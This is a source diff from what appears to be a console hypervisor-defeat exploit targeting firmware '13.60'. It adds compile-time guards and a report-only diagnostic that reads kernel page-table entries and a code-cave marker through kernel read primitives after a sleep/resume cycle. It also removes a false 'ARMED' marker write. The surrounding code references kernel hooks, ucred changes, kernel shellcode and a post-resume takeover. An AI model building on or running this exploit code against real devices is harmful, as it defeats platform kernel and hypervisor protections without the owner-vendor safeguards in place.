@@ -147,6 +147,26 @@ extern unsigned int takeover_bin_len;
 #define PL5_1360_STAGE_PRE_SLEEP 0
 #endif
 
+/*
+ * T5 report-only resume diagnostic (compiled only with
+ * -DPL5_1360_RESUME_REPORT_ONLY=1).
+ *
+ * Why the four gates below and not one: the diagnostic exists to ask whether
+ * *the staging* survives a standby/resume cycle. If any of arming, takeover or
+ * pre-sleep Linux staging is switched on at the same time, the answer is
+ * confounded by a second, louder change, which is precisely the ambiguity this
+ * test is meant to remove. So the combination is refused at compile time
+ * instead of being merely documented.
+ */
+#ifndef PL5_1360_RESUME_REPORT_ONLY
+#define PL5_1360_RESUME_REPORT_ONLY 0
+#endif
+#if PL5_1360_RESUME_REPORT_ONLY &&                                              \
+    (PL5_1360_ARM_HOOK || PL5_1360_ACK_EXPERIMENTAL_ARMING ||                   \
+     PL5_1360_TAKEOVER || PL5_1360_STAGE_PRE_SLEEP)
+#error "13.60: PL5_1360_RESUME_REPORT_ONLY=1 requires PL5_1360_ARM_HOOK=0, PL5_1360_ACK_EXPERIMENTAL_ARMING=0, PL5_1360_TAKEOVER=0 and PL5_1360_STAGE_PRE_SLEEP=0 -- the report-only path must not arm, take over or stage the Linux hand-off (docs/ANALYST-NEXT-STEPS-1360.md)"
+#endif
+
 #if PL5_1360_TAKEOVER
 /* TODO(13.60): fill from a live dump before enabling the takeover. */
 #define PL5_1360_HV_VMMCALL_HANDLER_PA 0x0ULL
@@ -865,7 +885,15 @@ int hv_defeat_1360_post_resume(void) {
    * So this line is expected to appear BEFORE the machine powers down -- it is
    * NOT evidence of a resume. The [W] line further down is the real one. */
   logmsg("13.60: [W0] pre-suspend (diag=%d); waiting for resume...\n", PL5_DIAG);
-#if PL5_DIAG == 5
+#if PL5_DIAG == 0
+  /* diag=0 promised a bare S3 round-trip: nothing was staged, so there is no
+   * vector to wait for, no cookie to expect and no reason to run the takeover
+   * continuation. Report that the round-trip completed and stop; the "never
+   * armed" refusal below belongs to builds that *should* have armed something. */
+  notify("13.60: diag=0: reached post-resume; nothing was staged or armed by "
+         "design, so nothing continues. Done.\n");
+  return 0;
+#elif PL5_DIAG == 5
   /* diag=5 arms nothing on purpose (escape only), so there is no vector to wait
    * for and no cookie to expect: go straight on to the offsets dump. */
   notify("13.60: diag=5: nothing armed by design; proceeding to the dump.\n");
@@ -1046,6 +1074,62 @@ int hv_defeat_1360_post_resume(void) {
 #endif /* PL5_DIAG >= 3 */
 }
 
+#if PL5_1360_RESUME_REPORT_ONLY
+/*
+ * T5: report-only post-resume path.
+ *
+ * It answers one question -- does the staging survive a real standby/resume
+ * cycle -- without arming the hook and without running the post-resume
+ * takeover, so it performs *no* kernel write at all: no ucred change, no
+ * page-table touch, no cave write. It reads only the page-table entries that
+ * describe kernel .text and the cave marker. The compile-time guards at the top
+ * of this file refuse a build that would add arming, takeover or pre-sleep
+ * staging to the same binary.
+ *
+ * What a run can and cannot show. A line printed here is positive evidence that
+ * the payload process survived the sleep and that the log still works. The
+ * absence of that line is NOT evidence of kernel damage: docs/1360-khook-death.md
+ * measured that userland, elfldr and the helper can simply not come back from
+ * this sleep, and the post-wake state check (make verify-resume) exists to read
+ * the state from outside the payload instead of inferring it from a log line.
+ */
+int hv_defeat_1360_report_resume(void) {
+  /* NB: `cave` is a macro in include/core/config.h (0x100000000ULL), so the
+   * local is named cave_addr -- the same name the rest of this file uses. */
+  uint64_t pm = kdlsym(KERNEL_SYM_PMAP_STORE);
+  uint64_t cave_addr = kdlsym(KERNEL_SYM_DATA_CAVE);
+  uint64_t e = 0, a;
+
+  notify("13.60: [R0] report-only resume reached (diag=%d arm=%d ack=%d "
+         "takeover=%d stage_pre_sleep=%d)\n",
+         PL5_DIAG, PL5_1360_ARM_HOOK, PL5_1360_ACK_EXPERIMENTAL_ARMING,
+         PL5_1360_TAKEOVER, PL5_1360_STAGE_PRE_SLEEP);
+
+  if (pm == 0 || cave_addr == 0) {
+    notify("13.60: [R1] cannot resolve pmap_store/data_cave; report incomplete.\n");
+    return -1;
+  }
+
+  /* .text page-table state. Reading the *entry* is safe; reading .text bytes is
+   * not, and this function deliberately does not do it. */
+  a = find_pde(pm, ktext, &e);
+  if (a != 0xFFFFFFFFFFFFFFFFull)
+    notify("13.60: [R2] ktext pde@%#lx=%#lx xotext=%lu rw=%lu\n",
+           (unsigned long)a, (unsigned long)e,
+           (unsigned long)PDE_FIELD(e, XOTEXT), (unsigned long)PDE_FIELD(e, RW));
+  a = find_pte(pm, ktext, &e);
+  if (a != 0xFFFFFFFFFFFFFFFFull)
+    notify("13.60: [R2] ktext pte@%#lx=%#lx xotext=%lu rw=%lu\n",
+           (unsigned long)a, (unsigned long)e,
+           (unsigned long)PDE_FIELD(e, XOTEXT), (unsigned long)PDE_FIELD(e, RW));
+
+  notify("13.60: [R3] cave ARMED marker = %#lx (this build never writes it)\n",
+         (unsigned long)kread64(cave_addr + CAVE_STATE_OFF));
+  notify("13.60: [R4] report-only done: no hook armed, no takeover, no write.\n");
+  return 0;
+}
+#endif /* PL5_1360_RESUME_REPORT_ONLY */
+
 /*
  * Live self-test of the khook machinery (Byepervisor's KHOOK_TEST pattern). We
  * install a one-shot hook on SYS_getuid+0xE that stamps the oracle cookie from
@@ -1180,11 +1264,20 @@ int hv_defeat_1360(void *shellcode_kernel, size_t shellcode_kernel_len) {
 #endif
 
 #if PL5_DIAG == 0
-  /* Stage 0: pure S3 round-trip. Arm nothing; just prove the payload process
-   * survives suspend/resume (post_resume prints [W] and returns). */
-  notify("13.60: diag=0: no escape, no hook; entering rest mode.\n");
+  /* Stage 0: pure S3 round-trip. Nothing is escaped, staged or armed here, so
+   * this path must not *claim* otherwise either: it deliberately does NOT write
+   * STATE_ARMED into the data cave. A marker is a statement that a hook is
+   * installed in shared kernel memory; writing it with g_armed=0 told a later
+   * run (and the adoption logic) something false, while post_resume refused the
+   * very run that had just been declared armed. The four states this file can be
+   * in are now distinct and named:
+   *   diag=0            -> S3 round-trip, no staging        (marker untouched)
+   *   diag>=1, arm=0    -> escape staged, hook NOT installed (no marker)
+   *   diag>=1, arm=1    -> hook armed                       (marker written)
+   *   post-resume       -> takeover, only with TAKEOVER=1   (marker read) */
+  notify("13.60: diag=0: S3 round-trip only (no escape, no staging, no hook, "
+         "no ARMED marker).\n");
   g_armed = 0;
-  kwrite64(cave_addr + CAVE_STATE_OFF, STATE_ARMED);
   return 0;
 #else
 #if PL5_1360_ARM_HOOK
